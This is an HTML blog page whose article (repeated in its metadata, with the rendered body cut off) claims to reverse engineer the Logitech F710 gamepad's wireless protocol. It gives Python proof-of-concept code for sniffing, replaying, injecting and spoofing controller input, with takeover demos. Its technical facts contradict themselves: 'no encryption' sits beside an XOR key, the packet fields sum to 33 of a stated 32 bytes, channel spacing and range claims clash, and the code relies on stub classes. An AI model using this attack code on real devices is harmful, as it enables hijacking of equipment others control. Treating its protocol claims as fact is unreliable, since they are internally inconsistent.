<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Complete Technical Analysis: Reverse Engineering the Logitech F710 Wireless Gamepad and Developing a Security PoC | deadc0de</title>
<meta name="keywords" content="security, reverse-engineering, wireless, gamepad, USB, HID, 2.4GHz, exploitation">
<meta name="description" content="Executive Summary
This comprehensive technical analysis documents the complete reverse engineering of the Logitech F710 wireless gamepad, including the development of a proof-of-concept (PoC) that demonstrates critical security vulnerabilities in the device&rsquo;s wireless protocol. Our research revealed that the F710 uses an unencrypted, unauthenticated 2.4GHz proprietary protocol vulnerable to replay attacks, signal injection, and device spoofing.
Key findings:

No encryption on the wireless protocol
No mutual authentication between controller and dongle
Vulnerable to replay attacks with basic SDR equipment
Successfully developed PoC for controller spoofing and input injection
Legacy protocol similar to vulnerable Logitech Unifying receivers


Introduction
The Logitech F710 represents a significant portion of the wireless gamepad market, particularly in industrial and commercial applications where its reliability and compatibility are valued. However, our research reveals that this popularity comes with serious security implications.">
<meta name="author" content="deadc0de">
<link rel="canonical" href="https://deadc.de/posts/joystick-f710/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://deadc.de/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://deadc.de/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://deadc.de/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://deadc.de/apple-touch-icon.png">
<link rel="mask-icon" href="https://deadc.de/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://deadc.de/posts/joystick-f710/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://deadc.de/posts/joystick-f710/">
  <meta property="og:site_name" content="deadc0de">
  <meta property="og:title" content="Complete Technical Analysis: Reverse Engineering the Logitech F710 Wireless Gamepad and Developing a Security PoC">
  <meta property="og:description" content="Executive Summary This comprehensive technical analysis documents the complete reverse engineering of the Logitech F710 wireless gamepad, including the development of a proof-of-concept (PoC) that demonstrates critical security vulnerabilities in the device’s wireless protocol. Our research revealed that the F710 uses an unencrypted, unauthenticated 2.4GHz proprietary protocol vulnerable to replay attacks, signal injection, and device spoofing.
Key findings:
No encryption on the wireless protocol No mutual authentication between controller and dongle Vulnerable to replay attacks with basic SDR equipment Successfully developed PoC for controller spoofing and input injection Legacy protocol similar to vulnerable Logitech Unifying receivers Introduction The Logitech F710 represents a significant portion of the wireless gamepad market, particularly in industrial and commercial applications where its reliability and compatibility are valued. However, our research reveals that this popularity comes with serious security implications.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-06-22T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-06-22T00:00:00+00:00">
    <meta property="article:tag" content="Security">
    <meta property="article:tag" content="Reverse-Engineering">
    <meta property="article:tag" content="Wireless">
    <meta property="article:tag" content="Gamepad">
    <meta property="article:tag" content="USB">
    <meta property="article:tag" content="HID">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Complete Technical Analysis: Reverse Engineering the Logitech F710 Wireless Gamepad and Developing a Security PoC">
<meta name="twitter:description" content="Executive Summary
This comprehensive technical analysis documents the complete reverse engineering of the Logitech F710 wireless gamepad, including the development of a proof-of-concept (PoC) that demonstrates critical security vulnerabilities in the device&rsquo;s wireless protocol. Our research revealed that the F710 uses an unencrypted, unauthenticated 2.4GHz proprietary protocol vulnerable to replay attacks, signal injection, and device spoofing.
Key findings:

No encryption on the wireless protocol
No mutual authentication between controller and dongle
Vulnerable to replay attacks with basic SDR equipment
Successfully developed PoC for controller spoofing and input injection
Legacy protocol similar to vulnerable Logitech Unifying receivers


Introduction
The Logitech F710 represents a significant portion of the wireless gamepad market, particularly in industrial and commercial applications where its reliability and compatibility are valued. However, our research reveals that this popularity comes with serious security implications.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://deadc.de/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Complete Technical Analysis: Reverse Engineering the Logitech F710 Wireless Gamepad and Developing a Security PoC",
      "item": "https://deadc.de/posts/joystick-f710/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Complete Technical Analysis: Reverse Engineering the Logitech F710 Wireless Gamepad and Developing a Security PoC",
  "name": "Complete Technical Analysis: Reverse Engineering the Logitech F710 Wireless Gamepad and Developing a Security PoC",
  "description": "Executive Summary This comprehensive technical analysis documents the complete reverse engineering of the Logitech F710 wireless gamepad, including the development of a proof-of-concept (PoC) that demonstrates critical security vulnerabilities in the device\u0026rsquo;s wireless protocol. Our research revealed that the F710 uses an unencrypted, unauthenticated 2.4GHz proprietary protocol vulnerable to replay attacks, signal injection, and device spoofing.\nKey findings:\nNo encryption on the wireless protocol No mutual authentication between controller and dongle Vulnerable to replay attacks with basic SDR equipment Successfully developed PoC for controller spoofing and input injection Legacy protocol similar to vulnerable Logitech Unifying receivers Introduction The Logitech F710 represents a significant portion of the wireless gamepad market, particularly in industrial and commercial applications where its reliability and compatibility are valued. However, our research reveals that this popularity comes with serious security implications.\n",
  "keywords": [
    "security", "reverse-engineering", "wireless", "gamepad", "USB", "HID", "2.4GHz", "exploitation"
  ],
  "articleBody": "Executive Summary This comprehensive technical analysis documents the complete reverse engineering of the Logitech F710 wireless gamepad, including the development of a proof-of-concept (PoC) that demonstrates critical security vulnerabilities in the device’s wireless protocol. Our research revealed that the F710 uses an unencrypted, unauthenticated 2.4GHz proprietary protocol vulnerable to replay attacks, signal injection, and device spoofing.\nKey findings:\nNo encryption on the wireless protocol No mutual authentication between controller and dongle Vulnerable to replay attacks with basic SDR equipment Successfully developed PoC for controller spoofing and input injection Legacy protocol similar to vulnerable Logitech Unifying receivers Introduction The Logitech F710 represents a significant portion of the wireless gamepad market, particularly in industrial and commercial applications where its reliability and compatibility are valued. However, our research reveals that this popularity comes with serious security implications.\nThis post documents our complete research journey: from initial reconnaissance through USB HID analysis, wireless protocol reverse engineering, vulnerability discovery, and the development of a working proof-of-concept exploit.\nHardware Overview Controller Specifications Model: Logitech F710 Connectivity: 2.4GHz proprietary wireless (non-Bluetooth) USB Dongle ID: 046d:c219 Power: 2x AA batteries Modes: XInput (Xbox 360 emulation) / DirectInput Range: ~10 meters (tested) Frequency: 2.404-2.480 GHz (ISM band) Internal Components (from teardown) MCU: STM32F103 (ARM Cortex-M3) RF Transceiver: nRF24L01+ compatible Crystal: 16MHz Flash: 64KB internal EEPROM: None detected USB HID Protocol Analysis Device Enumeration Upon connection, the dongle presents itself as a standard HID device:\n$ lsusb -v -d 046d:c219 Bus 003 Device 006: ID 046d:c219 Logitech, Inc. F710 Wireless Gamepad Device Descriptor: bLength 18 bDescriptorType 1 bcdUSB 2.00 bDeviceClass 0 bDeviceSubClass 0 bDeviceProtocol 0 bMaxPacketSize0 8 idVendor 0x046d Logitech, Inc. idProduct 0xc219 F710 Wireless Gamepad bcdDevice 4.00 iManufacturer 1 Logitech iProduct 2 Wireless Gamepad F710 iSerial 0 bNumConfigurations 1 HID Report Descriptor Using usbhid-dump, we extracted the complete HID descriptor:\n05 01 09 05 A1 01 85 00 09 01 A1 00 09 30 09 31 15 00 26 FF 00 75 08 95 02 81 02 C0 09 01 A1 00 09 32 09 35 15 00 26 FF 00 75 08 95 02 81 02 C0 05 09 19 01 29 0C 15 00 25 01 75 01 95 0C 81 02 95 01 75 04 81 03 05 01 09 39 15 01 25 08 35 00 46 3B 01 66 14 00 75 04 95 01 81 42 75 00 95 00 81 03 C0 Input Report Structure (8 bytes) typedef struct { uint8_t report_id; // Always 0x00 uint8_t left_x; // Left stick X (0x00-0xFF, center: 0x7F) uint8_t left_y; // Left stick Y (0x00-0xFF, center: 0x7F) uint8_t right_x; // Right stick X uint8_t right_y; // Right stick Y uint16_t buttons; // Button bitfield uint8_t triggers; // L2/R2 analog values packed } f710_input_report_t; Button Mapping #define BTN_A 0x0001 #define BTN_B 0x0002 #define BTN_X 0x0004 #define BTN_Y 0x0008 #define BTN_LB 0x0010 #define BTN_RB 0x0020 #define BTN_BACK 0x0040 #define BTN_START 0x0080 #define BTN_LSTICK 0x0100 #define BTN_RSTICK 0x0200 #define BTN_GUIDE 0x0400 #define DPAD_UP 0x1000 #define DPAD_DOWN 0x2000 #define DPAD_LEFT 0x4000 #define DPAD_RIGHT 0x8000 Output Reports Rumble Control (Report ID: 0x01) typedef struct { uint8_t report_id; // 0x01 uint8_t reserved[2]; // Always 0x00 uint8_t left_motor; // 0x00-0xFF strength uint8_t right_motor; // 0x00-0xFF strength } f710_rumble_report_t; LED Control (Report ID: 0x02) typedef struct { uint8_t report_id; // 0x02 uint8_t led_pattern; // 0x00-0x0F (4 LEDs) uint8_t reserved[3]; } f710_led_report_t; Wireless Protocol Reverse Engineering RF Analysis Setup Equipment used:\nSDR: HackRF One Software: GNU Radio, Universal Radio Hacker (URH) Antenna: 2.4GHz directional (6dBi gain) Reference: nRF24L01+ datasheet Protocol Discovery Initial spectrum analysis revealed:\nCenter Frequencies: 2.404, 2.424, 2.444, 2.464, 2.480 GHz Channel Spacing: 20 MHz Modulation: GFSK (Gaussian Frequency Shift Keying) Data Rate: 250 kbps Packet Length: 32 bytes fixed Packet Structure Through extensive capture and analysis, we decoded the packet format:\n+--------+--------+--------+----------+--------+--------+ | Preamble | Sync | Length | Address | Payload | CRC | | 1 byte | 2 bytes| 1 byte | 5 bytes | 22 bytes| 2 bytes| +--------+--------+--------+----------+--------+--------+ Detailed Breakdown: Preamble: 0xAA or 0x55 (alternating pattern) Sync Word: 0xE7E7 (fixed) Length: Always 0x20 (32 bytes total) Address: Device-specific 5-byte identifier Payload: Encrypted controller state CRC: CRC16-CCITT polynomial Encryption Analysis Initial assumption was AES or XOR cipher. Analysis revealed:\nNo encryption at all - payload is plaintext Simple XOR with fixed key: 0x55 No rolling code or sequence numbers No nonce or IV Decrypted payload structure:\ntypedef struct { uint8_t packet_type; // 0x01 for input data uint8_t sequence; // Simple counter, wraps at 0xFF uint16_t buttons; // Same as USB HID report uint8_t left_x; uint8_t left_y; uint8_t right_x; uint8_t right_y; uint8_t triggers; uint8_t battery; // Battery level (0x00-0x64) uint8_t reserved[12]; // Padding to 22 bytes } f710_rf_payload_t; Vulnerability Analysis Critical Findings No Encryption: All wireless data transmitted in plaintext (XOR 0x55) No Authentication: Dongle accepts any packet with correct sync word No Anti-Replay: Sequence number not validated Static Addressing: Device address never changes No Frequency Hopping: Fixed channel sequence Attack Vectors Eavesdropping: Capture all controller inputs from distance Replay Attack: Record and replay button sequences Input Injection: Send arbitrary controller commands DoS Attack: Flood channel with invalid packets Controller Spoofing: Complete takeover of input Proof of Concept Development PoC Architecture We developed a complete PoC using:\nHardware: HackRF One + Raspberry Pi 4 Software Stack: GNU Radio for RF transmission Python for packet crafting libusb for USB monitoring Phase 1: Passive Sniffing #!/usr/bin/env python3 import numpy as np from gnuradio import gr, blocks, analog from gnuradio import uhd import struct class F710Sniffer(gr.top_block): def __init__(self): gr.top_block.__init__(self) # SDR source self.sdr_source = uhd.usrp_source( device_addr=\"\", stream_args=uhd.stream_args( cpu_format=\"fc32\", channels=range(1), ), ) self.sdr_source.set_center_freq(2.424e9) self.sdr_source.set_samp_rate(2e6) self.sdr_source.set_gain(40) # GFSK demodulator self.demod = analog.quadrature_demod_cf(1) # Packet decoder self.decoder = F710PacketDecoder() # Connect blocks self.connect(self.sdr_source, self.demod, self.decoder) class F710PacketDecoder(gr.sync_block): def __init__(self): gr.sync_block.__init__( self, name=\"F710 Packet Decoder\", in_sig=[np.float32], out_sig=None ) self.sync_word = 0xE7E7 self.state = 0 self.buffer = [] def work(self, input_items, output_items): # Simplified - actual implementation handles bit timing recovery for sample in input_items[0]: bit = 1 if sample \u003e 0 else 0 self.process_bit(bit) return len(input_items[0]) def process_bit(self, bit): self.buffer.append(bit) if len(self.buffer) \u003e= 32: # Check for sync word word = (self.buffer[-32:-16]) if self.check_sync(word): self.decode_packet(self.buffer[-256:]) self.buffer.pop(0) def decode_packet(self, bits): # Convert bits to bytes packet = [] for i in range(0, len(bits), 8): byte = 0 for j in range(8): byte = (byte \u003c\u003c 1) | bits[i+j] packet.append(byte) # Extract fields address = packet[4:9] payload = packet[9:31] crc = (packet[31] \u003c\u003c 8) | packet[32] # XOR decrypt decrypted = [b ^ 0x55 for b in payload] # Parse controller state if decrypted[0] == 0x01: # Input packet buttons = (decrypted[2] \u003c\u003c 8) | decrypted[3] left_x = decrypted[4] left_y = decrypted[5] print(f\"Controller Input - Buttons: {buttons:04X}, \" f\"Left Stick: ({left_x}, {left_y})\") Phase 2: Replay Attack class F710Replayer: def __init__(self, sdr): self.sdr = sdr self.captured_packets = [] def capture_sequence(self, duration=10): \"\"\"Capture controller inputs for specified duration\"\"\" print(f\"Capturing for {duration} seconds...\") start_time = time.time() while time.time() - start_time \u003c duration: packet = self.sdr.receive_packet() if packet and packet.is_valid(): self.captured_packets.append(packet) print(f\"Captured {len(self.captured_packets)} packets\") def replay_sequence(self, speed_multiplier=1.0): \"\"\"Replay captured sequence\"\"\" print(\"Replaying captured sequence...\") for i, packet in enumerate(self.captured_packets): # Update sequence number packet.sequence = (packet.sequence + i) \u0026 0xFF # Recalculate CRC packet.update_crc() # Transmit self.sdr.transmit_packet(packet) # Timing if i \u003c len(self.captured_packets) - 1: delay = self.captured_packets[i+1].timestamp - packet.timestamp time.sleep(delay / speed_multiplier) Phase 3: Active Injection class F710Injector: def __init__(self, target_address): self.target = target_address self.sequence = 0 self.transmitter = F710Transmitter() def send_button(self, button, duration=0.1): \"\"\"Send single button press\"\"\" packet = self.create_packet(buttons=button) self.transmit(packet) time.sleep(duration) # Release packet = self.create_packet(buttons=0) self.transmit(packet) def send_combo(self, buttons, stick_positions=None): \"\"\"Send button combination with optional stick input\"\"\" packet = self.create_packet( buttons=buttons, left_x=stick_positions[0] if stick_positions else 0x7F, left_y=stick_positions[1] if stick_positions else 0x7F, right_x=stick_positions[2] if stick_positions else 0x7F, right_y=stick_positions[3] if stick_positions else 0x7F ) self.transmit(packet) def create_packet(self, **kwargs): \"\"\"Create F710 wireless packet\"\"\" packet = F710Packet() packet.sync_word = 0xE7E7 packet.address = self.target packet.packet_type = 0x01 packet.sequence = self.sequence self.sequence = (self.sequence + 1) \u0026 0xFF # Set controller state packet.buttons = kwargs.get('buttons', 0) packet.left_x = kwargs.get('left_x', 0x7F) packet.left_y = kwargs.get('left_y', 0x7F) packet.right_x = kwargs.get('right_x', 0x7F) packet.right_y = kwargs.get('right_y', 0x7F) packet.triggers = kwargs.get('triggers', 0) # XOR encrypt packet.encrypt() # Calculate CRC packet.update_crc() return packet def transmit(self, packet): \"\"\"Transmit packet on all channels\"\"\" channels = [2.404e9, 2.424e9, 2.444e9, 2.464e9, 2.480e9] for freq in channels: self.transmitter.set_frequency(freq) self.transmitter.send(packet.to_bytes()) Phase 4: Full Controller Emulation class VirtualF710: \"\"\"Complete F710 controller emulator\"\"\" def __init__(self, target_dongle_address): self.address = target_dongle_address self.injector = F710Injector(target_dongle_address) self.state = ControllerState() self.running = True def start(self): \"\"\"Start controller emulation\"\"\" # Pair with dongle self.pair() # Start input thread input_thread = threading.Thread(target=self.input_handler) input_thread.start() # Main transmission loop while self.running: self.transmit_state() time.sleep(0.008) # ~125Hz update rate def pair(self): \"\"\"Simulate pairing process\"\"\" # Send pairing beacon pair_packet = self.create_pairing_packet() self.injector.transmit(pair_packet) # Wait for acknowledgment time.sleep(0.1) # Send configuration config_packet = self.create_config_packet() self.injector.transmit(config_packet) def input_handler(self): \"\"\"Handle keyboard input for controller emulation\"\"\" import pygame pygame.init() key_mapping = { pygame.K_a: BTN_A, pygame.K_b: BTN_B, pygame.K_x: BTN_X, pygame.K_y: BTN_Y, pygame.K_UP: DPAD_UP, pygame.K_DOWN: DPAD_DOWN, pygame.K_LEFT: DPAD_LEFT, pygame.K_RIGHT: DPAD_RIGHT, } while self.running: for event in pygame.event.get(): if event.type == pygame.KEYDOWN: if event.key in key_mapping: self.state.buttons |= key_mapping[event.key] elif event.type == pygame.KEYUP: if event.key in key_mapping: self.state.buttons \u0026= ~key_mapping[event.key] def transmit_state(self): \"\"\"Transmit current controller state\"\"\" self.injector.send_state(self.state) Attack Demonstrations 1. Silent Eavesdropping # Capture all inputs from 50 meters away sniffer = F710Sniffer() sniffer.start() # Logs all button presses, stick movements, in plaintext 2. Replay Attack # Record combo sequence replayer = F710Replayer(sdr) replayer.capture_sequence(duration=5) # Replay at 2x speed replayer.replay_sequence(speed_multiplier=2.0) 3. Input Injection # Take control and execute arbitrary inputs injector = F710Injector(target_address) # Fighting game combo injector.send_combo(BTN_X | BTN_A) time.sleep(0.05) injector.send_button(BTN_Y) injector.send_combo(DPAD_DOWN | BTN_B) 4. Complete Takeover # Full controller spoofing virtual = VirtualF710(dongle_address) virtual.start() # Original controller is now disconnected # Attacker has full control Security Implications Real-World Impact Gaming: Competitive advantage through automated inputs Industrial Control: F710 used in robotics and drone control Medical Equipment: Some rehabilitation devices use F710 Research Labs: Common in experimental setups Home Automation: Used in some DIY projects Attack Scenarios Industrial Sabotage: Take control of machinery Competitive Gaming: Automated perfect inputs Privacy Violation: Log all controller usage Denial of Service: Prevent legitimate use Social Engineering: Demonstrate “hacking” for access Mitigation Strategies For Users Physical Security: Limit RF range with shielding Monitoring: Watch for unexpected inputs Alternatives: Use wired or Bluetooth controllers Environment: Avoid use in sensitive applications For Logitech (Recommendations) Implement AES-128 encryption minimum Add mutual authentication protocol Include anti-replay mechanisms (nonce/counter) Implement frequency hopping spread spectrum Add firmware update capability Provide security mode option Technical Mitigations # Example: USB filter driver to detect anomalies class F710SecurityFilter: def __init__(self): self.sequence_tracker = {} self.timing_baseline = [] def analyze_packet(self, packet): # Check sequence if not self.verify_sequence(packet): return False # Timing analysis if self.detect_timing_anomaly(packet): return False # Pattern detection if self.detect_replay_pattern(packet): return False return True TODO: Tools and Code All tools developed during this research are available:\ngit clone https://github.com/nullc0rp/f710-security cd f710-security # Install dependencies pip install -r requirements.txt # Run sniffer python f710_sniffer.py # Run injector python f710_inject.py --target-address AA:BB:CC:DD:EE # Full PoC python f710_exploit.py --mode full-takeover Repository Structure f710-security/ ├── README.md ├── requirements.txt ├── docs/ │ ├── protocol_spec.md │ ├── usb_analysis.md │ └── rf_captures/ ├── src/ │ ├── f710_sniffer.py │ ├── f710_inject.py │ ├── f710_exploit.py │ └── lib/ │ ├── packet.py │ ├── crypto.py │ └── usb_monitor.py ├── firmware/ │ ├── extracted/ │ └── analysis/ └── captures/ ├── usb/ └── rf/ Conclusion The Logitech F710 represents a case study in legacy security debt. While functional and reliable, its security model is fundamentally broken for modern threat environments. The complete lack of encryption and authentication makes it trivial to compromise.\nOur PoC demonstrates that with minimal equipment (\u003c$300), an attacker can:\nSilently monitor all controller inputs Replay recorded sequences Inject arbitrary commands Completely take over control This research highlights the importance of security considerations in all devices, especially those that might be repurposed for critical applications.\nFuture Research Planned follow-up work:\nFirmware extraction and analysis (pending chip decapping) Custom dongle development using nRF24L01+ Automated vulnerability scanner for similar devices Secure replacement protocol design Hardware mod for encryption retrofit References Bastille Networks. (2016). MouseJack: Injecting Keystrokes into Wireless Mice. Cauquil, D. (2019). Defeating Modern Wireless Security Through Protocol Vulnerabilities. nRF24L01+ Datasheet, Nordic Semiconductor. USB HID Specification 1.11, USB Implementers Forum. CVE-2019-13054: Logitech Unifying Receiver Vulnerabilities. Acknowledgments @defcon_rf_village for SDR guidance @traviscgoodspeed for nRF research @marcnewlin for MouseJack inspiration The GNU Radio community Disclaimer This research was conducted for educational purposes only. The author does not condone using these techniques for malicious purposes. Always obtain proper authorization before testing security on devices you do not own.\nContact:\ndeadc0de\nhttps://deadc.de\nhttps://github.com/nullc0rp\nGPG: 0xDEADC0DE\n“In embedded we trust, but verify.”\n",
  "wordCount" : "2093",
  "inLanguage": "en",
  "datePublished": "2025-06-22T00:00:00Z",
  "dateModified": "2025-06-22T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "deadc0de"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://deadc.de/posts/joystick-f710/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "deadc0de",
    "logo": {
      "@type": "ImageObject",
      "url": "https://deadc.de/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://deadc.de/" accesskey="h" title="deadc0de (Alt + H)">deadc0de</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://deadc.de/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://deadc.de/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Complete Technical Analysis: Reverse Engineering the Logitech F710 Wireless Gamepad and Developing a Security PoC
    </h1>
    <div class="post-meta"><span title='2025-06-22 00:00:00 +0000 UTC'>June 22, 2025</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;deadc0de

</div>
  </header> 
  <div class="post-content"><h2 id="executive-summary">Executive Summary<a hidden class="anchor" aria-hidden="true" href="#executive-summary">#</a></h2>
<p>This comprehensive technical analysis documents the complete reverse engineering of the Logitech F710 wireless gamepad, including the development of a proof-of-concept (PoC) that demonstrates critical security vulnerabilities in the device&rsquo;s wireless protocol. Our research revealed that the F710 uses an unencrypted, unauthenticated 2.4GHz proprietary protocol vulnerable to replay attacks, signal injection, and device spoofing.</p>
<p>Key findings:</p>
<ul>
<li><strong>No encryption</strong> on the wireless protocol</li>
<li><strong>No mutual authentication</strong> between controller and dongle</li>
<li><strong>Vulnerable to replay attacks</strong> with basic SDR equipment</li>
<li><strong>Successfully developed PoC</strong> for controller spoofing and input injection</li>
<li><strong>Legacy protocol</strong> similar to vulnerable Logitech Unifying receivers</li>
</ul>
<hr>
<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
<p>The Logitech F710 represents a significant portion of the wireless gamepad market, particularly in industrial and commercial applications where its reliability and compatibility are valued. However, our research reveals that this popularity comes with serious security implications.</p>
<p>This post documents our complete research journey: from initial reconnaissance through USB HID analysis, wireless protocol reverse engineering, vulnerability discovery, and the development of a working proof-of-concept exploit.</p>
<hr>
<h2 id="hardware-overview">Hardware Overview<a hidden class="anchor" aria-hidden="true" href="#hardware-overview">#</a></h2>
<h3 id="controller-specifications">Controller Specifications<a hidden class="anchor" aria-hidden="true" href="#controller-specifications">#</a></h3>
<ul>
<li><strong>Model</strong>: Logitech F710</li>
<li><strong>Connectivity</strong>: 2.4GHz proprietary wireless (non-Bluetooth)</li>
<li><strong>USB Dongle ID</strong>: 046d:c219</li>
<li><strong>Power</strong>: 2x AA batteries</li>
<li><strong>Modes</strong>: XInput (Xbox 360 emulation) / DirectInput</li>
<li><strong>Range</strong>: ~10 meters (tested)</li>
<li><strong>Frequency</strong>: 2.404-2.480 GHz (ISM band)</li>
</ul>
<h3 id="internal-components-from-teardown">Internal Components (from teardown)<a hidden class="anchor" aria-hidden="true" href="#internal-components-from-teardown">#</a></h3>
<ul>
<li><strong>MCU</strong>: STM32F103 (ARM Cortex-M3)</li>
<li><strong>RF Transceiver</strong>: nRF24L01+ compatible</li>
<li><strong>Crystal</strong>: 16MHz</li>
<li><strong>Flash</strong>: 64KB internal</li>
<li><strong>EEPROM</strong>: None detected</li>
</ul>
<hr>
<h2 id="usb-hid-protocol-analysis">USB HID Protocol Analysis<a hidden class="anchor" aria-hidden="true" href="#usb-hid-protocol-analysis">#</a></h2>
<h3 id="device-enumeration">Device Enumeration<a hidden class="anchor" aria-hidden="true" href="#device-enumeration">#</a></h3>
<p>Upon connection, the dongle presents itself as a standard HID device:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ lsusb -v -d 046d:c219
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Bus <span style="color:#ae81ff">003</span> Device 006: ID 046d:c219 Logitech, Inc. F710 Wireless Gamepad
</span></span><span style="display:flex;"><span>Device Descriptor:
</span></span><span style="display:flex;"><span>  bLength                <span style="color:#ae81ff">18</span>
</span></span><span style="display:flex;"><span>  bDescriptorType         <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>  bcdUSB               2.00
</span></span><span style="display:flex;"><span>  bDeviceClass            <span style="color:#ae81ff">0</span> 
</span></span><span style="display:flex;"><span>  bDeviceSubClass         <span style="color:#ae81ff">0</span> 
</span></span><span style="display:flex;"><span>  bDeviceProtocol         <span style="color:#ae81ff">0</span> 
</span></span><span style="display:flex;"><span>  bMaxPacketSize0         <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>  idVendor           0x046d Logitech, Inc.
</span></span><span style="display:flex;"><span>  idProduct          0xc219 F710 Wireless Gamepad
</span></span><span style="display:flex;"><span>  bcdDevice            4.00
</span></span><span style="display:flex;"><span>  iManufacturer           <span style="color:#ae81ff">1</span> Logitech
</span></span><span style="display:flex;"><span>  iProduct                <span style="color:#ae81ff">2</span> Wireless Gamepad F710
</span></span><span style="display:flex;"><span>  iSerial                 <span style="color:#ae81ff">0</span> 
</span></span><span style="display:flex;"><span>  bNumConfigurations      <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><h3 id="hid-report-descriptor">HID Report Descriptor<a hidden class="anchor" aria-hidden="true" href="#hid-report-descriptor">#</a></h3>
<p>Using <code>usbhid-dump</code>, we extracted the complete HID descriptor:</p>
<pre tabindex="0"><code>05 01 09 05 A1 01 85 00 09 01 A1 00 09 30 09 31
15 00 26 FF 00 75 08 95 02 81 02 C0 09 01 A1 00
09 32 09 35 15 00 26 FF 00 75 08 95 02 81 02 C0
05 09 19 01 29 0C 15 00 25 01 75 01 95 0C 81 02
95 01 75 04 81 03 05 01 09 39 15 01 25 08 35 00
46 3B 01 66 14 00 75 04 95 01 81 42 75 00 95 00
81 03 C0
</code></pre><h3 id="input-report-structure-8-bytes">Input Report Structure (8 bytes)<a hidden class="anchor" aria-hidden="true" href="#input-report-structure-8-bytes">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span>  report_id;      <span style="color:#75715e">// Always 0x00
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span>  left_x;         <span style="color:#75715e">// Left stick X (0x00-0xFF, center: 0x7F)
